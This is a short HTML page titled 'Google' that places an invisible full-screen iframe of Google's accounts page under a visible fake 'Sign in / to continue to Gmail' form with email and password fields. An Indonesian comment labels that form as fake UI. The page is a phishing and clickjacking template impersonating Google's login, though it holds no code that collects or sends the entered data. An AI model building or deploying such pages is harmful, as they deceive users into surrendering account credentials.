<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google</title>
</head>
<body style="margin:0; padding:0; overflow:hidden;">
    <!-- Iframe asli Google (tidak terlihat) -->
    <iframe src="https://accounts.google.com" style="width:100vw; height:100vh; border:none; opacity:0; position:absolute; top:0; left:0; z-index:1;"></iframe>
    
    <!-- UI Palsu di atasnya -->
    <div style="position:absolute; top:0; left:0; width:100vw; height:100vh; background:#fff; z-index:2; display:flex; justify-content:center; align-items:center; flex-direction:column;">
        <h2>Sign in</h2>
        <p style="color:#5f6368;">to continue to Gmail</p>
        <input type="text" placeholder="Email" style="padding:10px; margin-bottom:10px; width:250px;">
        <input type="password" placeholder="Password" style="padding:10px; margin-bottom:10px; width:250px;">
        <button style="padding:10px 20px; background:#1a73e8; color:#fff; border:none; border-radius:4px;">Next</button>
    </div>
</body>
</html>
